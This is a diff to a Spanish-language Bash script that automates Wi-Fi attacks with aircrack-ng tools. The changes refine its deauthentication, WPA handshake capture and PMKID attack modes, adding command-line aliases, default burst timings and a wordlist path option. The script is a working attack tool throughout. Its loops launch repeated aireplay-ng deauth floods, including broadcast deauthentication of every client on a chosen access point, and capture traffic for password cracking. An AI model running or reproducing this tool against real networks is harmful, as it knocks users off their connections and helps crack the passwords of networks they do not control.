@@ -18,7 +18,7 @@ function ctrl_c(){
 	echo -e "\n${yellowColour}[*]${endColour}${grayColour}Saliendo${endColour}"
 	tput cnorm; airmon-ng stop "${networkCard}mon" > /dev/null 2>&1
 	ip link set ${networkCard} down >/dev/null 2>&1; macchanger -p ${networkCard} >/dev/null 2>&1
-	ip link set ${networkCard} up >/dev/null 2>&1; sleep 0.25
+	ip link set ${networkCard} up >/dev/null 2>&1; sleep 0.25; systemctl start NetworkManager >/dev/null 2>&1
 	exit 0
 }
 
@@ -83,8 +83,8 @@ function interfaceModeMonitor(){
 					checker=1
 				fi; sleep 0.5
 			done
-		done; rm interface
-	fi
+		done
+	fi; rm interface
 
 	sleep 0.25; echo -e "${readColour}::${endColour} ${grayColour}Configurando netword cart${endColour}"
 	sleep 0.25; airmon-ng start $networkCard >/dev/null 2>&1; airmon-ng check kill >/dev/null 2>&1
@@ -135,7 +135,7 @@ function attackDeauth (){
 			echo -en "\t${yellowColour}STATYON: ${endColour}" && read ST
 		fi
 	fi
-##
+
 	if [ "$MORE_OPT" != "false" ] || [[ "$numS" != "" && "$numSI" != "" && "$num" != "" ]]; then
 		opt=""; if [[ "$numS" == "" && "$numSI" == "" && "$num" == "" ]]; then
 			until [[ $opt =~ (y|n|Y|N) ]]; do
@@ -164,55 +164,42 @@ function attackDeauth (){
 		sleep 0.5; echo -ne "${readColour}::${endColour} ${grayColour}Para matar el ataque presione [ENTER]: ${endColour}"; read
 		sleep 0.5; kill -9 $xtermAireplayPIB; wait $xtermAireplayPIB &>/dev/null; sleep 0.5
 	fi; kill -9 $xtermAirodump_AP_PID &>/dev/null; wait $xtermAirodump_AP_PID &>/dev/null; sleep 0.5; ctrl_c
-
-echo '
-	if [ "$opt" == "stop" ]; then
-		sleep 0.5; echo -e "\t\t${readColour}::${endColour} ${grayColour}Kill attack${endColour}"
-		sleep 0.5; kill -9 $xtermAirodump_AP_PID 2>/dev/null; wait $xtermAirodump_AP_PID 2>/dev/null
-		sleep 0.5; kill -9 $xtermAireplayPIB 2>/dev/null; wait $xtermAireplayPIB 2>/dev/null
-		sleep 0.5; echo -e "\t\t${readColour}::${endColour} ${grayColour}Attack stop${endColour}"
-		sleep 0.5; ctrl_c
-	elif [ "$opt" == "newAttack" ]; then
-		clear
-	elif [ "$opt" == "stopANDnew" ]; then
-		sleep 0.5; echo -e "\t\t${readColour}::${endColour} ${grayColour}Kill attack${endColour}"
-                sleep 0.5; kill -9 $xtermAirodump_AP_PID 2>/dev/null; wait $xtermAirodump_AP_PID 2>/dev/null
-                sleep 0.5; kill -9 $xtermAireplayPIB 2>/dev/null; wait $xtermAireplayPIB 2>/dev/null
-		sleep 0.5; echo -e "\t\t${readColour}::${endColour} ${grayColour}Attack stop${endColour}"
-		sleep 0.5; clear
-	else
-		ctrl_c
-	fi
-' &> /dev/null
 }
 
 function attackHandshake(){
-	xterm -hold -e "airodump-ng ${networkCard}mon" 2> /dev/null &
-	xtermAirodumpPID=$!
+	if [ "$BSSID" == "" ] && [ "$CH" == "" ]; then
+		xterm -hold -e "airodump-ng ${networkCard}mon" 2> /dev/null &
+		xtermAirodumpPID=$!
 
-	echo -en "\t${yellowColour}BSSID: ${endColour}" && read BSSID
-	echo -en "\t${yellowColour}Channel: ${endColour}" && read CH
-	sleep 1; kill -9 $xtermAirodumpPID; wait $xtermAirodumpPID 2>/dev/null
+		echo -ne "\t${yellowColour}BSSID: ${endColour}" && read BSSID
+		echo -ne "\t${yellowColour}Channel: ${endColour}" && read CH
+		sleep 1; kill -9 $xtermAirodumpPID; wait $xtermAirodumpPID 2>/dev/null
+	fi
 
 	xterm -hold -e "airodump-ng --bssid $BSSID --channel $CH --write Captura ${networkCard}mon" 2>/dev/null &
 	xtermAirodump_AP_PID=$!; sleep 1
 
-	until [[ $mode =~ (y|n|Y|N) ]]; do
-		echo -en "\t${yellowColour}De-autenticación GLOBAL(y/n): ${endColour}" && read mode
-        done
+	if [ "$ST" == "" ]; then
+		until [[ $mode =~ (y|n|Y|N) ]]; do
+			echo -en "\t${yellowColour}De-autenticación GLOBAL(y/n): ${endColour}" && read mode
+        	done
 
-	if [ "$mode" == "y" ] || [ "$mode" == "Y" ]; then
-		ST='FF:FF:FF:FF:FF:FF'
-	else
-		echo -en "\t${yellowColour}STATYON: ${endColour}" && read ST
+		if [ "$mode" == "y" ] || [ "$mode" == "Y" ]; then
+			ST='FF:FF:FF:FF:FF:FF'
+		else
+			echo -en "\t${yellowColour}STATYON: ${endColour}" && read ST
+		fi
 	fi
 
-	echo -en "\t${yellowColour}Duracion (s): ${endColour}" && read numS; sleep 0.5
-	echo -en "\t${yellowColour}Intervalo (s): ${endColour}" && read numSI; sleep 0.5
-	echo -en "\t${yellowColour}Numero de veces: ${endColour}" && read num; sleep 0.5
+	if [ "$MORE_OPT" == "true" ]; then #|| [[ "$numS" != "" && "$numSI" != "" && "$num" != "" ]]; then
+		echo -en "\t${yellowColour}Duracion (s): ${endColour}" && read numS; sleep 0.5
+		echo -en "\t${yellowColour}Intervalo (s): ${endColour}" && read numSI; sleep 0.5
+		echo -en "\t${yellowColour}Numero de veces: ${endColour}" && read num; sleep 0.5
+	fi
 
-	for (( c=1; c<=$num; c++ ))
-	do
+	if [ "$MORE_OPT" == "defauld" ]; then numS=4; numSI=20; num=4; fi
+
+	for (( c=1; c<=$num; c++ )); do
 		xterm -hold -e "aireplay-ng --deauth 1111 -a $BSSID -c ${ST} ${networkCard}mon 2>/dev/null" 2>/dev/null &
         	xtermAireplayPID=$!
 		sleep $numS; kill -9 $xtermAireplayPID; wait $xtermAireplayPID 2>/dev/null; sleep $numSI
@@ -320,11 +307,23 @@ function attack(){
                 done
 	fi
 
-	if [ "$attackMode" == "DEAUTH" ]; then attackDeauth
-	elif [ "$attackMode" == "HANDSHAKE" ]; then attackHandshake
-	elif [ "$attackMode" == "PMKID" ]; then attackPMKID
+	if [[ "$attackMode" == "DEAUTH" || "$attackMode" == "deauth" || "$attackMode" == "0" ]]; then attackDeauth
+	elif [[ "$attackMode" == "HANDSHAKE" || "$attackMode" == "handshake" || "$attackMode" == "1" ]]; then attackHandshake
+	elif [[ "$attackMode" == "PMKID" || "$attackMode" == "pmkid" || "$attackMode" == "2" ]]; then attackPMKID
 	else echo -e "${redColour}:: Modo de ataque no valido${endColour}"; ctrl_c
 	fi
+}
+
+function defauld_value(){
+#       variables["--install"]="INSTALL"
+	if [ "$INSTALL" == "" ]; then INSTALL="true"; fi
+
+#	variables["--more-options"]="MORE_OPT"
+	if [ "$MORE_OPT" == "" ]; then MORE_OPT="true"; fi
+	if [ "$MORE_OPT" == "FALSE" ]; then MORE_OPT="false"; fi
+	if [ "$MORE_OPT" == "DEFAULD" ]; then MORE_OPT="defauld"; fi
+
+	if [ "$ruteDic" != "" ]; then test -f "$ruteDic"; if [ $? -ne 0 ]; then ctrl_c; fi; fi
 }
 
 #echo "XTerm*selectToClipboard: true" > ~/.Xresources
@@ -344,10 +343,12 @@ if [ "$(id -u)" == "0" ]; then
 	variables["--attack-mode"]="attackMode"
 	variables["--install"]="INSTALL"
 	variables["--more-options"]="MORE_OPT"
+	variables["--rute"]="ruteDic"
 
 	variables["-i"]="networkCard"
 	variables["-s"]="SYSTEM_USER"
 	variables["-m"]="attackMode"
+	variables["-r"]="ruteDic"
 
 	for i in "$@"; do
 		arguments[$index]=$i;
@@ -367,11 +368,11 @@ if [ "$(id -u)" == "0" ]; then
   		fi
 
   		index=index+1;
-	done
+	done; defauld_value
 
 	if [[ "$MORE_OPT" != "false" && "$MORE_OPT" != "" ]]; then
 		numS=$(echo "$MORE_OPT" | cut -d "," -f 1); numSI=$(echo "$MORE_OPT" | cut -d "," -f 2)
-		num=$(echo "$MORE_OPT" | cut -d "," -f 3); #MORE_OPT="false"
+		num=$(echo "$MORE_OPT" | cut -d "," -f 3); #MORE_OPT="mode-term"
 	fi
 
 	if [ "$SYSTEM_USER" == "" ]; then
@@ -380,8 +381,10 @@ if [ "$(id -u)" == "0" ]; then
         	done
 	fi
 
+	#if [[ "$INSTALL" == "true" || "$INSTALL" == "TRUE" ]]; then dependencies; ctrl_c; fi
+
 	if [ "$SYSTEM_USER" == "arch" ] || [ "$SYSTEM_USER" == "debian" ] || [ "$SYSTEM_USER" == "ubuntu" ] || [ "$SYSTEM_USER" == "fedora" ]; then
-		clear; if [ "$INSTALL" != "false" ]; then dependencies; fi; codeCheck=1
+		clear; if [[ "$INSTALL" == "true" || "$INSTALL" == "TRUE" ]]; then dependencies; fi; codeCheck=1
 		while :
 		do
 			if [ "$codeCheck" == "1" ]; then interfaceModeMonitor; else attack; fi
